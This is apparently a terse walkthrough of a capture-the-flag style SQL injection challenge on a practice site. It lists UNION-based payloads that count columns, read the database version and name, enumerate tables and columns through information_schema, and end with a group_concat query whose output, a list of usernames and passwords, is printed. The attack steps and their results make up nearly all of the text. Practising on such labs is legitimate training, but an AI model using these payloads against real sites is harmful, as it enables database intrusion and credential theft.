SQl Injection Death row challenge 1

http://leettime.net/sqlninja.com/tasks/deathrow_ch1.php?id=1

id=-1%20--

order by 5--
--found 5 columns

union select null,version(),null,null,null
--5.6.47-cll-lve

union%20select%20null,database(),null,null,null
--leettime_761wHole


union select null,table_name,null,null,null from information_schema.tables where table_schema=database() limit 0,1
--testtable1
--userlogs
--users

union select null,column_name,null,null,null from information_schema.columns where table_schema=database() and table_name ='users' limit 0,1
-- id
-- username
-- password
-- user_type
-- sec_code

union select null,group_concat(username,0x09,password,0x0a),null,null,null from (select username,password from users limit 0,10)a

 injector	khan
 decompiler	hacktract
 devilhunte	dante
 Zen	sec-idiots
 Zenodermus	security-i
 grayhat	hacker
 khan	haxor
 admin	sadmin
